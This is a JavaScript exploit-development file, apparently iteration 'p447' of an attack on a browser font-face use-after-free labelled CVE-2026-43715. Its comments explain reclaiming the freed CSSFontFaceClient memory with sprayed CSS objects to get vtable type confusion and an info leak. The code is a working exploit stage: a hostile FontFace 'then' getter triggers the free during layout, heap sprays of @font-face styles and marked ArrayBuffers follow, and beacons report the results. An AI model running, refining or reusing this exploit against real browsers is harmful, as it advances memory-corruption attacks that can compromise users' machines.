// p447 — CVE-2026-43715 Stage 2: spray REAL clients into the freed slot
// Beacon prefix: V447-
//
// p446 result (7/7): ArrayBuffer marker spray does not save the process.
// The loop's callback is a virtual dispatch — offset 0 of the replacement
// memory must be a valid CSSFontFaceClient vtable pointer. Raw bytes can
// never provide that; only real objects can.
//
// v447 sprays real same-family CSS machinery inside the getter, after the
// free: @font-face styles + text sinks + forced layout allocate
// CSSFontFace/CSSFontFaceSource/CSSSegmentedFontFace-class objects. If one
// occupies the freed client's block, the loop's virtual call dispatches a
// REAL vtable — a type-confused callback on the wrong object instead of a
// crash. ArrayBuffers remain as secondary filler only.
//
// Outcome beacons: SURVIVED/ALIVE = confusion lived; DIRTY = engine wrote
// into a sprayed ArrayBuffer (info leak); death = allocation timing or
// class mismatch, iterate next.

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V447-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  window.onerror = function(msg, src, line, col) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 100));
    return false;
  };

  var SRC = 'local(Helvetica)';
  var sprayAB = [];
  var sprayStyles = [];
  var hits = 0;

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      B('THEN-' + hits);
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here

        // Spray A: real CSS client objects.
        for (var k = 0; k < 40; k++) {
          var fam = 's' + hits + 'x' + k;
          var st = document.createElement('style');
          st.textContent = '@font-face { font-family: ' + fam + '; src: ' + SRC + '; }';
          document.head.appendChild(st);
          var d = document.createElement('div');
          d.style.fontFamily = fam;
          d.textContent = 'A';
          document.body.appendChild(d);
          sprayStyles.push(st);
        }
        document.body.offsetHeight;      // force lookups -> client objects

        // Spray B: ArrayBuffer filler (marker), secondary.
        var SIZES = [96, 128, 192, 256, 384, 512];
        for (var s = 0; s < SIZES.length; s++) {
          for (var n = 0; n < 16; n++) {
            var u8 = new Uint8Array(new ArrayBuffer(SIZES[s]));
            for (var i = 0; i < u8.length; i += 8) {
              u8[i] = 0x47; u8[i+1] = 0x34; u8[i+2] = 0x34; u8[i+3] = 0x56;
              u8[i+4] = s; u8[i+5] = n & 0xff;
            }
            sprayAB.push(u8);
          }
        }
        B('SPRAY-' + hits + '-css40-ab' + sprayAB.length);
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  function scan() {
    var dirty = 0, ex = '';
    for (var k = 0; k < sprayAB.length; k++) {
      var u8 = sprayAB[k];
      for (var i = 0; i < u8.length; i += 8) {
        if (u8[i] !== 0x47 || u8[i+1] !== 0x34 || u8[i+2] !== 0x34 ||
            u8[i+3] !== 0x56) {
          dirty++;
          if (ex.length < 160)
            ex += 'k' + k + '@' + i + ':' + u8[i].toString(16) +
              u8[i+1].toString(16) + u8[i+2].toString(16) + u8[i+3].toString(16) + ' ';
          break;
        }
      }
    }
    if (dirty) B('DIRTY-' + dirty + '-' + encodeURIComponent(ex));
    else B('CLEAN');
  }

  function round(i) {
    var fam = 'g' + i;

    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: ' + fam + '; src: ' + SRC + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var faces = [];
    document.fonts.forEach(function(f) { faces.push(f); });
    var face = faces.find(function(f) {
      return f.family.replace(/['"]/g, '') === fam;
    });
    if (!face) { B('NOFACE-' + i); return; }

    void face.loaded;
    B('LOAD-' + i);

    face.load().then(
      function() { B('SURVIVED-' + i + '-H' + hits); scan(); },
      function(e) { B('NO-' + i + '-' + encodeURIComponent(String(e)).slice(0, 60)); }
    );
  }

  round(0);
  setTimeout(function() { B('ALIVE-1S-H' + hits); scan(); }, 1000);
  setTimeout(function() { B('ALIVE-3S-H' + hits); }, 3000);
})();
